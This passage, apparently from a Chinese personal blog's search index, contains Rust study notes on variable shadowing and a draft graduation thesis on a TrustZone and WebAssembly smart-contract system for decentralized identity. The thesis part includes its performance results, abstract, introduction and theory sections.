33%\">\n</colgroup>\n<thead>\n<tr>\n<th>功能模块</th>\n<th>平均响应时间（ms）</th>\n<th>最小值（ms）</th>\n<th>最大值（ms）</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Create DID</td>\n<td>3059.91</td>\n<td>3056.13</td>\n<td>3100.83</td>\n<td>包含签名校验与链上文档存储</td>\n</tr>\n<tr>\n<td>Query DID</td>\n<td>216.31</td>\n<td>198.79</td>\n<td>281.29</td>\n<td>纯读取链上状态</td>\n</tr>\n<tr>\n<td>Verify VC</td>\n<td>2119.69</td>\n<td>1793.26</td>\n<td>2318.74</td>\n<td>包含 AES 解密与条件判断</td>\n</tr>\n</tbody>\n</table>\n<hr>\n<h4 id=\"结果分析\">结果分析</h4>\n<ul>\n<li><strong>Query DID</strong>\n的平均响应时间最短（≈216ms），表明系统在处理链上状态读取请求时效率较高，能够满足高频身份信息检索需求。</li>\n<li>Create DID 的平均延迟约为 3 秒，与区块链交易处理周期一致。</li>\n<li><strong>Verify VC</strong> 响应时间约为 2.1\n秒，是当前实现中计算最复杂的路径。尽管延迟相对较高，但仍保持在可接受范围内，能够支持多数实际身份验证场景。</li>\n</ul>\n<h4 id=\"结论\">结论</h4>\n<p>本测试展示了在单线程、无并发干扰条件下，系统核心功能的响应能力，验证了本架构在轻量化\nTEE\n环境中运行隐私合约的可行性与实用性。特别是在移动终端或边缘计算等部署场景中，DID\n查询和 VC\n验证均可实现秒级响应，充分体现了系统在保障隐私与安全的同时仍具备良好的服务性能。</p>\n<h1 id=\"conclusion\">Conclusion</h1>\n<p>本文提出了一种基于 ARM TrustZone 与 WebAssembly\n的轻量级智能合约执行架构。通过将合约逻辑与敏感数据处理隔离至安全世界，系统在保障隐私性的同时，兼顾了与现有区块链框架的兼容性。针对可信执行环境与链上存储之间的交互需求，设计了基于共享内存与扩展\nWASI 接口的高效通信机制，支持链上合约请求与链下可信执行的协同工作。</p>\n<p>在此基础上，本文实现了一个支持加密形式下可验证凭证（VC）校验的去中心化身份（DID）系统，采用\nECDH 密钥交换与 AES\n加密机制，实现了无需泄露明文信息的零知识式身份验证，适用于资源受限环境下的隐私保护应用。</p>\n<p>实验结果表明，虽然 TrustZone\n引入了一定的性能开销，但系统在查询、交易及隐私验证场景下均保持了可接受的延迟与吞吐表现，验证了在受限设备中部署隐私增强型智能合约的可行性。</p>\n<p>未来工作将继续优化 REE 与 TEE\n之间的通信效率，探索在更严格安全假设下，如何提升TEE环境中隐私保护与攻击防御的能力。进一步，让丰富智能合约的安全原语，使其兼容更复杂的隐私计算任务。</p>\n","categories":["笔记"],"tags":["TrustZone","智能合约","毕设"]},{"title":"Rust 学习笔记 - 变量与可变性","url":"/rust/1-%E5%8F%98%E9%87%8F%E4%B8%8E%E5%8F%AF%E5%8F%98%E6%80%A7/","content":"<blockquote>\n<p>本文属于学习笔记，内容可能有误、可能不全面，仅代表个人在学习这一特性时的理解和总结</p>\n</blockquote>\n<p>开始学习Rust。这是第一篇学习笔记，记录一些基础的概念。</p>\n<span id=\"more\"></span>\n<h1 id=\"rust-变量与可变性\">1 Rust 变量与可变性</h1>\n<h2 id=\"常量\">1.1 常量</h2>\n<p>Rust中的常量与其他语言类似，使用 <code>const</code>\n声明，命名规范为<strong>所有字母大写，用下划线分割</strong> 。</p>\n<p>常量声明时，<strong>必须指定类型</strong>，<strong>必须赋初值</strong>。并且初值只能是<strong>常量表达式</strong>，不能是函数的调用结果、或是运行过程中计算得到的值。</p>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> THREE_HOURS_IN_SECONDS: <span class=\"type\">u32</span> = <span class=\"number\">60</span> * <span class=\"number\">60</span> * <span class=\"number\">3</span>;</span><br></pre></td></tr></table></figure>\n<h2 id=\"变量\">1.2 变量</h2>\n<p>Rust中的变量使用 <code>let</code> 声明，可以自动推导类别，也可以使用\n<code>:</code> 指定类别。</p>\n<p>变量又分为：<strong>可变变量</strong>和<strong>不可变变量</strong>，<code>let</code>\n声明的默认是不可变变量，在变量前加上 <code>mut</code> 才是可变变量。</p>\n<h3 id=\"可变变量\">1.2.1 可变变量</h3>\n<p>可变变量的使用方法是符合在其他编程语言里使用习惯的写法，直接使用\n<code>=</code> 进行赋值，变量的类型无法更改。</p>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">fn</span> <span class=\"title function_\">main</span>() {</span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"keyword\">mut </span><span class=\"variable\">x</span> = <span class=\"number\">5</span>;</span><br><span class=\"line\">    x = <span class=\"number\">6</span>; <span class=\"comment\">// 正确</span></span><br><span class=\"line\">    x = <span class=\"string\">\"abc\"</span>; <span class=\"comment\">// 改变了类型，错误</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<h3 id=\"不可变变量-shadow\">1.2.2 不可变变量 &amp; Shadow</h3>\n<p>顾名思义，不可变变量无法直接复制修改：</p>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">fn</span> <span class=\"title function_\">main</span>() {</span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">x</span> = <span class=\"number\">5</span>;</span><br><span class=\"line\">    x = <span class=\"number\">6</span>; <span class=\"comment\">// 错误 </span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">error[E0384]: cannot assign twice to immutable variable `x`</span><br><span class=\"line\"> --&gt; test.rs:3:5</span><br><span class=\"line\">  |</span><br><span class=\"line\">2 |     <span class=\"built_in\">let</span> x = 5;</span><br><span class=\"line\">  |         -</span><br><span class=\"line\">  |         |</span><br><span class=\"line\">  |         first assignment to `x`</span><br><span class=\"line\">  |         <span class=\"built_in\">help</span>: consider making this binding mutable: `mut x`</span><br><span class=\"line\">3 |     x = 6; // 错误 </span><br><span class=\"line\">  |     ^^^^^ cannot assign twice to immutable variable</span><br><span class=\"line\"></span><br><span class=\"line\">error: aborting due to 1 previous error; 2 warnings emitted</span><br></pre></td></tr></table></figure>\n<p>传统的方法在Rust里变得复杂了，说明Rust一定提出了一个更好的特性——<strong>Shadow</strong></p>\n<p>Rust允许使用 <code>let</code> 创建同名变量，例如：</p>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">fn</span> <span class=\"title function_\">main</span>() {</span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">x</span> = <span class=\"number\">5</span>;</span><br><span class=\"line\">    <span class=\"built_in\">println!</span>(<span class=\"string\">\"The value of x is: {}\"</span>, x);</span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">x</span> = <span class=\"number\">6</span>;</span><br><span class=\"line\">    <span class=\"built_in\">println!</span>(<span class=\"string\">\"The value of x is: {}\"</span>, x);</span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">x</span> = x * <span class=\"number\">2</span>;</span><br><span class=\"line\">    <span class=\"built_in\">println!</span>(<span class=\"string\">\"The value of x is: {}\"</span>, x);</span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">x</span> = <span class=\"string\">\"hello\"</span>;</span><br><span class=\"line\">    <span class=\"built_in\">println!</span>(<span class=\"string\">\"The value of x is: {}\"</span>, x);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>结果是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">The value of x is: 5</span><br><span class=\"line\">The value of x is: 6</span><br><span class=\"line\">The value of x is: 12</span><br><span class=\"line\">The value of x is: hello</span><br></pre></td></tr></table></figure>\n<p>并不像其他编程语言里，定义同名变量通常会报错。Rust直接使用后定义的变量覆盖之前定义的变量。因为这是重新定义变量，所以甚至可以改变变量的类型。</p>\n<p>这个过程被取了一个好听的名字\nShadow，新变量像把旧变量罩住了、盖住了一样。</p>\n<p>这个特性最好用的地方就在于<strong>可以改变变量的类型</strong>。</p>\n<p>在其他语言中经常有以下情况，在类型转换前后需要定义两个不同名称的变量，实际上他们表达的含义是完全相同的。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>{</span><br><span class=\"line\">\t<span class=\"type\">char</span> score_str[] = <span class=\"string\">\"123\"</span>;</span><br><span class=\"line\">    <span class=\"type\">int</span> score = <span class=\"built_in\">atoi</span>(score_str);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>使用 Rust 可以解决这个问题：</p>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">fn</span> <span class=\"title function_\">main</span>() {</span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">score</span> = <span class=\"string\">\"123\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">score</span>: <span class=\"type\">i32</span> = score.<span class=\"title function_ invoke__\">parse</span>().<span class=\"title function_ invoke__\">unwrap</span>();</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>即保证了变量的强类型安全性，又保留了使用的便捷性。很优雅。</p>\n<p>还有一个情景 shadow\n很好用。假如我在写一个很复杂的数学公式，公式的好几个部分都用到了同样的符号\n<code>a</code></p>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">fn</span> <span class=\"title function_\">main</span>() {</span><br><span class=\"line\">\t<span class=\"keyword\">let</span> <span class=\"variable\">a</span> = <span class=\"number\">3</span>;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">b</span> = a + <span class=\"number\">1</span> ... </span><br><span class=\"line\">    <span class=\"comment\">// 此处省略一大堆内容</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">// 在里上面的a隔了好多行的地方，我又想定义一个变量a</span></span><br><span class=\"line\">    <span class=\"comment\">// 我可以当作之前从来没有使用过那个变量a一样，直接定义一个新的a</span></span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">a</span> = <span class=\"number\">4</span>;</span><br><span class=\"line\">    <span class=\"comment\">// 在后续的代码中，我也会很自然的认为a就是我最近定义的a = 4</span></span><br><span class=\"line\">    <span class=\"comment\">// 而不会是之前的 a = 3</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>另外，shadow 可变变量会报 warning：</p>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">fn</span> <span class=\"title function_\">main</span>() {</span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"keyword\">mut </span><span class=\"variable\">score</span> = <span class=\"string\">\"123\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">score</span>: <span class=\"type\">i32</span> = score.<span class=\"title function_ invoke__\">parse</span>().<span class=\"title function_ invoke__\">unwrap</span>();</span><br><span class=\"line\">    <span class=\"built_in\">println!</span>(<span class=\"string\">\"score: {}\"</span>, score);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">warning: variable does not need to be mutable</span><br><span class=\"line\"> --&gt; test.rs:2:9</span><br><span class=\"line\">  |</span><br><span class=\"line\">2 |     <span class=\"built_in\">let</span> mut score = <span class=\"string\">\"123\"</span>;</span><br><span class=\"line\">  |         ----^^^^^</span><br><span class=\"line\">  |         |</span><br><span class=\"line\">  |         <span class=\"built_in\">help</span>: remove this `mut`</span><br><span class=\"line\">  |</span><br><span class=\"line\">  = note: `#[warn(unused_mut)]` on by default</span><br><span class=\"line\"></span><br><span class=\"line\">warning: 1 warning emitted</span><br><span class=\"line\"></span><br><span class=\"line\">score: 123</span><br></pre></td></tr></table></figure>\n<p>因为这样写语法上没问题，但是这样就改变了使用 <code>mut</code>\n的本意。</p>\n<p>我的理解是：</p>\n<ul>\n<li>如果需要使用的变量是传统意义的变量，也就是其他编程语言中最常用的变量，使用\n<code>let mut</code> 声明可变变量。</li>\n<li>不可变变量的 shadow\n就是用来解决无用中间变量过多的问题。生命周期短的变量，都可以使用不可变变量，因为他们通常不会被修改，并且影响的范围很小。解决了一个变量名焦虑的问题。</li>\n</ul>\n","categories":["笔记"],"tags":["学习笔记","Rust"]},{"title":"毕设23 - 毕业论文的草稿","url":"/graduation-project/23/","content":"<p>最后一篇，毕业论文的草稿，写完了回去贴到 overleaf 里。</p>\n<span id=\"more\"></span>\n<p>题目：基于 TrustZone 的元宇宙分布式数字身份系统研究与实现</p>\n<p>重点是实现分布式数字身份。为了解决隐私问题，引入了 TrustZone 。但是\nTrustZone 和智能合约难以结合，又开发了一个基于 TrustZone 的 Wasm\n智能合约模块。Wasm\n用于降低开发难度。该模块也不仅限于使用在DID场景里，也可以用于开发其他的诸如匿名投票等合约。</p>\n<h1 id=\"摘要\">摘要</h1>\n<p>随着区块链与数字身份技术的发展，用户对隐私保护与可信身份验证提出了更高要求。传统智能合约在执行过程中公开所有输入与状态，难以满足敏感身份信息处理的隐私需求。本文提出了一种基于\nARM TrustZone 与 WebAssembly\n的轻量级智能合约执行架构，通过将合约逻辑与数据处理隔离至可信执行环境，实现了对用户隐私的硬件级保护。该架构集成\nWasm 运行时，降低了隐私合约的开发门槛，并设计了基于共享内存与扩展 WASI\n接口的高效跨域通信机制。</p>\n<p>在此基础上，本文构建了一个支持加密可验证凭证（VC）校验的分布式数字身份系统。该系统结合\nECDH 密钥协商与 AES\n对称加密，实现了无需暴露明文信息的零知识属性验证机制，适用于资源受限的移动与边缘环境。为验证系统的可用性，本文以虚拟电影院为应用场景，展示了用户在不泄露真实年龄的前提下完成购票与验票流程的全过程。</p>\n<p>实验结果表明，本系统在 TrustZone\n环境下的合约执行性能保持在可接受范围内，DID 注册、VC\n校验等关键操作均可实现秒级响应，验证了在移动设备中部署隐私增强型智能合约的可行性与实用性。</p>\n<p>随着区块链与数字身份技术的发展，越来越多的应用对链上计算提出了更高的隐私保护与可信执行要求。传统智能合约在执行过程中公开全部输入、状态与逻辑，难以满足处理敏感身份信息或隐私数据的实际需求。为此，本文提出了一种基于\nARM TrustZone 与\nWebAssembly（Wasm）的轻量级智能合约执行架构。该系统将合约逻辑与数据处理隔离于\nTrustZone 安全世界中，提供硬件级隐私保护，并集成 Wasm\n运行时以降低隐私合约的开发复杂度。为实现链上请求与受限环境间的高效交互，本文设计了基于共享内存与扩展\nWASI 接口的高性能通信机制。</p>\n<p>在此基础上，本文实现了一个支持加密形式下可验证凭证（VC）校验的分布式数字身份（DID）系统，结合\nECDH 密钥交换与 AES\n对称加密，实现无需明文暴露的零知识属性验证机制，适用于资源受限的移动与边缘计算环境。为展示系统的应用能力，本文进一步设计并实现了一个虚拟电影院原型系统，用户可在不泄露真实年龄等敏感信息的前提下完成去中心化身份注册、购票与验票流程。</p>\n<p>实验评估表明，尽管引入 TrustZone 带来一定性能开销，系统在 DID\n注册、VC\n验证、链上交易等操作中仍保持了良好的延迟与吞吐表现。研究结果验证了在移动终端与边缘设备中部署隐私增强型智能合约系统的可行性与实用性，为构建可信、隐私友好的链上应用提供了一种可行解决方案。</p>\n<h1 id=\"引言\">1 引言</h1>\n<h2 id=\"研究背景与意义\">1.1 研究背景与意义</h2>\n<blockquote>\n<ul>\n<li>元宇宙中数字身份的关键作用</li>\n<li>数字身份隐私保护的重要性与现有问题</li>\n</ul>\n</blockquote>\n<p>随着数字化服务的日益发展，用户在数字世界中的身份管理和隐私保护问题成为亟待解决的挑战。然而，当前大多数身份系统仍依赖于中心化平台进行身份托管与认证，存在隐私泄露风险大、可移植性差、用户控制权缺失等问题。用户的身份数据通常掌握在平台方手中，无法真正实现“自我主权身份”的愿景。</p>\n<p>分布式数字身份（Decentralized Identity,\nDID）技术的兴起为解决上述问题提供了新的方向。它允许用户拥有并控制自己的身份标识和凭证，消除了对中心化身份提供者的依赖。但与此同时，如何在分布式架构下实现高效、安全、可验证的隐私保护机制仍面临重大挑战。<strong>[分布式数字身份及其在工业互联网中的应用]</strong></p>\n<p>与此同时，区块链作为一种可验证、不可篡改的分布式账本技术，在构建身份基础设施方面展现出独特优势。然而，传统区块链智能合约的完全公开执行模型导致用户输入、合约逻辑及运行状态全部暴露在链上，给涉及敏感数据的应用（如身份验证、医疗记录、隐私投票等）带来了严重的隐私泄露风险。因此，如何在保障用户隐私的同时，确保链上身份认证和凭证验证的可验证性，已成为区块链系统设计中的关键难题。</p>\n<p>为兼顾隐私保护与可验证性，本课题引入了基于 ARM TrustZone\n的可信执行环境（Trusted Execution Environment,\nTEE），通过硬件隔离机制将敏感身份数据与认证逻辑部署于安全世界执行，避免在链上暴露敏感信息，从而构建轻量级、可信任、去中心化的数字身份系统。同时，为降低合约开发门槛、提升跨平台适应性，系统采用\nWebAssembly (Wasm)\n作为智能合约执行格式，进一步支持用户在终端设备上安全高效地运行身份相关合约。本研究不仅提升了用户身份的安全保障，也为资源受限终端设备部署隐私增强型区块链应用提供了可行路径，具有重要的理论意义与现实价值。</p>\n<h2 id=\"现有数字身份技术与隐私保护方法\">1.2\n现有数字身份技术与隐私保护方法</h2>\n<h3 id=\"数字身份技术的演变\">1.2.1 数字身份技术的演变</h3>\n<blockquote>\n<p>中心化数字身份、联盟身份到分布式数字身份的演变。（可以增加引用了）</p>\n</blockquote>\n<p>随着信息化与网络服务的快速发展，用户身份的数字化表示与管理方式经历了从中心化身份（Centralized\nIdentity）到联盟身份（Federated\nIdentity），再到分布式数字身份的逐步演变，每一阶段均试图在用户体验、隐私保护与系统可扩展性之间寻找更优平衡。</p>\n<p>在早期阶段，中心化身份模型广泛应用于各类互联网平台。该模型由单一身份提供方（Identity\nProvider, IdP）负责用户信息的存储与验证，典型代表如谷歌账户、苹果 ID\n等。这种模式部署简单、认证效率高，但用户需将全部身份数据托付于中心平台，一旦平台遭受攻击或发生泄露，将造成严重的隐私与信任风险。研究表明，该模型在数据主权、隐私控制与系统弹性方面存在天然缺陷\n[A Comparative Survey of Centralised and Decentralised Identity\nManagement Systems: Analysing Scalability, Security, and\nFeasibility]。</p>\n<p>为提升身份跨域互操作性，联盟身份模型应运而生。它允许多个独立组织之间通过建立信任联盟共享身份认证信息，使用户可在多个系统间“单点登录”而无需重复注册或验证。该模式显著改善了用户体验与认证效率，常见标准包括\nSAML、OAuth 2.0 和 OpenID\nConnect。然而，联盟身份仍依赖中心化信任锚（如特定 IdP\n或认证服务器），在隐私泄露防护与用户主权控制方面仍显不足 [A Survey on\nFederated Identity Management Systems: Limitations and Solutions.”\nJournal of Network and Computer\nApplications]。此外，不同组织间信任协同的成本也限制了其可扩展性</p>\n<p>近年来，分布式数字身份作为新一代身份管理范式逐渐兴起。它基于区块链等分布式账本技术（DLT），将身份标识的生成、管理与验证权力归还给用户自身，强调“自我主权身份（Self-Sovereign\nIdentity, SSI）”理念。在该模型下，用户拥有并控制自己的公私钥、DID\n文档与可验证凭证（VC），实现对个人身份数据的最小披露与可控共享。该模式在提升隐私性、安全性与可移植性的同时，也面临认证逻辑下沉、资源受限设备支持等实际落地难题\n[Survey on Digital Sovereignty and Identity: From Digitization to\nDigitalization.]。。</p>\n<h3 id=\"分布式数字身份中的隐私保护\">1.2.2\n分布式数字身份中的隐私保护</h3>\n<blockquote>\n<p>零知识证明。zk-SNARK、zk-STARK。基于默克尔树的选择性披露。</p>\n</blockquote>\n<p>在分布式数字身份系统中，隐私保护始终是一个重要的问题。相比传统身份认证方式，DID\n虽然消除了对中心化身份提供者的依赖，但也带来了新的挑战：如何让用户在不泄露完整身份信息的前提下，向验证方证明其满足某些属性要求（如“已满18岁”、“为某机构注册用户”等）。</p>\n<p>为解决这一问题，选择性披露技术应运而生。该机制允许用户仅披露某一条或少数几条经授权的信息，而无需暴露整个凭证内容，从而实现最小化数据暴露。较为常见的一种实现方式是基于\n默克尔树构造凭证结构，用户仅需提交特定字段的哈希路径，即可证明其身份数据在原凭证中确实存在，兼顾完整性验证与隐私保护\n[Selective disclosure of claims from multiple digital credentials]。</p>\n<p>另一个重要方向是 零知识证明（Zero-Knowledge Proof, ZKP）。ZKP\n是一类密码学协议，允许证明者向验证者证明某一声明为真，却无需透露任何除该声明之外的额外信息\n[The knowledge complexity of interactive proof-systems]。ZKP\n技术为分布式身份系统的隐私验证提供了强有力支撑，当前已有多种主流方案。</p>\n<ul>\n<li><strong>zk-SNARK（Zero-Knowledge Succinct Non-Interactive Argument\nof Knowledge）</strong>[A Survey on the Applications of Zero-Knowledge\nProofs]\n是目前应用最广泛的一类零知识证明系统，具备证明体积小、验证速度快等优点，已被\nZcash、Tornado Cash\n等项目用于实现匿名交易。其缺点在于依赖“可信设定”（Trusted\nSetup），一旦初始密钥泄露，系统安全性将面临严重风险；同时，其开发门槛较高，需要将计算逻辑转换为电路或约束系统，证明生成开销大，难以适配移动设备或边缘环境。</li>\n<li><strong>zk-STARK（Scalable Transparent ARguments of\nKnowledge）</strong> [Scalable, transparent, and post-quantum secure\ncomputational\nintegrity]则通过使用哈希函数代替传统代数结构，避免了可信设定问题，并具备抗量子攻击能力，适用于大规模验证任务。该方案已被应用于\nStarkNet、zkML\n等高性能区块链项目中。但其证明生成过程对硬件资源要求高，难以在低功耗终端中高效部署。</li>\n</ul>\n<p>尽管 zk\n系统在安全性与隐私保护方面具备强大优势，但其计算负担重、开发复杂度高、对运行环境要求高等问题，使其难以直接应用于资源受限设备。</p>\n<p>相比之下，本文提出的身份系统采取了不同策略：将身份验证与凭证校验逻辑放置于\nARM TrustZone\n构建的可信执行环境中，借助硬件隔离实现隐私保护。在本系统中，用户使用\n<strong>ECDH</strong> 协议与合约共享密钥，使用 <strong>AES</strong>\n对称加密凭证后提交，可信执行环境内部执行解密与属性判断，从而实现一种零知识证明机制，并天然支持选择性披露、属性范围证明、多凭证聚合验证等功能。该方案不依赖复杂电路转换与可信设定，部署门槛低，性能稳定，尤其适合于移动终端与边缘计算等低资源场景。</p>\n<h2 id=\"trustzone与智能合约结合的相关工作\">1.3\nTrustZone与智能合约结合的相关工作</h2>\n<blockquote>\n<p>照搬related work</p>\n<ul>\n<li>TrustZone 简介与隐私保护优势</li>\n<li>相关工作\n<ul>\n<li>TZ4Fabric</li>\n<li>WaTZ</li>\n<li>有研究表明 TrustZone 的信道测攻击</li>\n</ul></li>\n</ul>\n</blockquote>\n<p>随着区块链对隐私保护与可信执行能力的需求不断提升，硬件可信执行环境逐渐成为保护合约执行安全的可行方案。其中，Arm\nTrustZone 是一种被广泛使用的 TEE\n技术。它通过将处理器划分为“安全世界（Secure World）”与“普通世界（Normal\nWorld）”，为敏感数据和计算逻辑提供了物理隔离的执行空间 [TrustZone\nExplained: Architectural Features and Use Cases]。与 Intel SGX 等其他\nTEE 技术相比，TrustZone\n更适用于移动设备和边缘终端，具备部署成本低、功耗小等优势。</p>\n<p>已有部分研究尝试将 TrustZone\n与区块链智能合约结合，以实现隐私增强的链上计算。</p>\n<ul>\n<li><p>TZ4Fabric 是首个将 TrustZone 应用于 Fabric 区块链的系统\n[TZ4Fabric: Executing Smart Contracts with ARM TrustZone : (Practical\nExperience Report)]。该方案将 Fabric 的链码执行逻辑转化为 TrustZone\n中运行的可信应用程序 （Trusted Application,\nTA），实现了链码的硬件隔离保护。然而，该设计存在两个主要问题：（1）每个链码需手动实现一个独立的\nTA，需以状态机方式细化合约流程，导致复杂合约难以维护；（2）用户部署新合约时需修改节点代码、更新中间代理模块并重启\nTrustZone\n服务，实际操作繁琐，难以满足区块链系统的可扩展性需求。</p></li>\n<li><p>WaTZ 提出了一种将 WebAssembly Micro Runtime（WAMR）移植至\nTrustZone 的方法，并实现了远程认证机制 [WaTZ: A Trusted WebAssembly\nRuntime Environment with Remote Attestation for TrustZone]。该工作表明在\nTEE 中嵌入通用 Wasm 运行时是可行的，为后续将 Wasm\n作为合约执行环境的系统奠定了基础。基于此思路，本文进一步构建了一个可动态加载\nWasm 合约的 TrustZone\n执行模块，实现了智能合约的即时部署与安全执行，提升了系统的开发友好性与可移植性。</p></li>\n</ul>\n<p>尽管 TrustZone\n提供了强隔离能力，其安全性也面临一定威胁。已有研究表明，TrustZone\n中的安全存储可能受到侧信道攻击与权限提升攻击的威胁 [Hardware-Backed\nHeist: Extracting ECDSA Keys from Qualcomm's TrustZone]。这些问题涉及\nTrustZone\n平台底层的安全机制实现，超出了本课题的讨论范围，但在未来构建更强隐私保障系统时仍值得深入研究。</p>\n<h2 id=\"本文所做的工作\">1.4 本文所做的工作</h2>\n<blockquote>\n<ul>\n<li>提出一种基于 TrustZone 和 Wasm 的智能合约执行架构，实现合约逻辑在\nTEE 中的安全执行与链上状态交互。</li>\n<li>提出一种结合共享密钥协商与对称加密的“零知识式”验证机制，替代传统 ZK\n方法，适用于资源受限设备。</li>\n<li>设计并实现一个轻量级分布式数字身份系统，支持 VC\n的加密提交与可信验证，保护用户隐私。并实现了一个元宇宙电影院场景验证该系统的可用性。</li>\n<li>本文的研究内容与组织结构安排</li>\n</ul>\n</blockquote>\n<p>针对当前数字身份系统中普遍存在的隐私泄露、可信度不足以及难以在资源受限设备中部署等问题，本文围绕“在可信执行环境中实现隐私增强型分布式数字身份系统”的目标展开研究，主要完成了以下工作：</p>\n<ol type=\"1\">\n<li><strong>提出一种基于 TrustZone 和 Wasm\n的智能合约执行架构</strong>。该架构将智能合约的执行环境迁移至 TrustZone\n安全世界，利用 WebAssembly\n运行时实现合约逻辑的轻量化部署与安全执行，并通过共享内存与扩展 WASI\n接口，实现与区块链节点的状态交互与通信，兼顾隐私保护与系统可扩展性。</li>\n<li><strong>设计一种结合共享密钥协商与对称加密的零知识式验证机制</strong>。用户通过\nECDH 协议生成共享密钥，将身份凭证加密后提交，由 TEE\n内部完成解密与条件判断，实现无需电路建模、无需可信设定的“轻量级零知识证明”，可部署于移动终端等资源受限场景中。</li>\n<li><strong>实现一个轻量级的分布式数字身份系统</strong>。支持 DID\n注册、VC 发放与 VC\n验证等核心功能，并确保身份数据全生命周期中的隐私与安全。进一步，本文构建了一个<strong>元宇宙虚拟电影院场景</strong>，展示该系统在典型应用环境中的可用性与通用性，验证了系统架构与身份验证流程的实用价值。</li>\n<li><strong>完成系统实现与功能测试</strong>。在 QEMU v8\n虚拟平台中完成区块链节点与 TrustZone\n合约执行环境的搭建，分别开展智能合约模块的性能测试、分布式数字身份系统的功能性验证，以及应用场景的交互流程测试，全面评估系统的稳定性与实际可用性。</li>\n</ol>\n<p>本论文的章节结构如下：</p>\n<ul>\n<li>第2章为<strong>理论基础部分</strong>，介绍分布式数字身份、区块链与智能合约、TrustZone\n架构与 Wasm 技术、相关密码学原语；</li>\n<li>第3章为<strong>系统设计与实现</strong>，分别阐述基于TrustZone的Wasm合约模块、分布式身份系统的工作流程及一个元宇宙应用示例；</li>\n<li>第4章为<strong>实验与测试</strong>，在虚拟化环境中对系统各模块进行性能与功能验证；</li>\n<li>第5章总结全文，并展望未来的扩展方向。</li>\n</ul>\n<h1 id=\"理论部分\">2 理论部分</h1>\n<h2 id=\"分布式数字身份\">2.1 分布式数字身份</h2>\n<blockquote>\n<ul>\n<li>去中心化数字身份（DID）与可验证凭证（VC）</li>\n</ul>\n</blockquote>\n<p>分布式数字身份（Decentralized Identity,\nDID）是一种自我主权、去中心化的身份管理方式。它允许用户无需依赖传统的中心化身份服务提供者，即可拥有并控制自己的身份标识与相关凭证。每个\nDID\n通常对应一对用户持有的加密密钥，用于实现身份的认证、授权与数据完整性保护，具备全局唯一性、可验证性与隐私性等特征。W3C（万维网联盟）制定了相关标准，规范了\nDID 的结构、解析方法及其关联文档的表达格式。DID\n由三部分组成：固定前缀“did”、方法标识符（指示该 DID\n采用的解析方案）和唯一标识符（用以标识用户实体）。</p>\n<p>每一个 DID 对应一份 分布式身份文档（DID Document），用于记录与该 DID\n相关的公钥、服务端点（Service\nEndpoint）、验证方法等信息。这些文档通常存储于公开可验证的分布式账本上，支持任意实体通过\nDID 进行信息查验，从而确保身份数据的完整性与可验证性。[DIDs]</p>\n<p>与 DID 配套使用的可验证凭证（Verifiable Credential,\nVC）是一种结构化数字证书，由权威发行方对某个用户属性（如姓名、年龄、学历等）进行签名背书，支持在多个主体之间安全、可信地交换身份信息。一个典型的\nVC\n体系包括三类参与者：发行者（Issuer）、持有者（Holder）与验证者（Verifier）。其中，发行者对凭证进行签名，持有者负责存储和管理，验证者则通过加密方式验证凭证的真实性与完整性，无需直接联系发行者即可完成验证，从而有效保障了用户隐私。</p>\n<h2 id=\"区块链与智能合约\">2.2 区块链与智能合约</h2>\n<blockquote>\n<ul>\n<li>区块链、智能合约</li>\n</ul>\n</blockquote>\n<p>区块链（Blockchain）\n是一种去中心化的分布式账本技术，最初作为比特币的底层数据结构提出，近年来已广泛应用于金融、溯源、数字身份等多个领域。区块链通过共识机制确保网络中各节点对账本状态达成一致，并通过密码学手段实现数据的不可篡改与可追溯性。每个区块中包含一组交易记录，并通过哈希函数与前一个区块相连接，从而形成链式结构，保障整个账本的完整性与安全性\n。与传统分布式数据库不同，区块链系统无需信任中心即可实现去信任化协作。其核心特性包括去中心化、防篡改、高可用与透明性，使其成为构建可信计算环境的重要技术基础。</p>\n<p>智能合约（Smart Contract）\n是部署在区块链上的自动化程序，用于根据预设规则执行协议内容。由 Nick\nSzabo 于 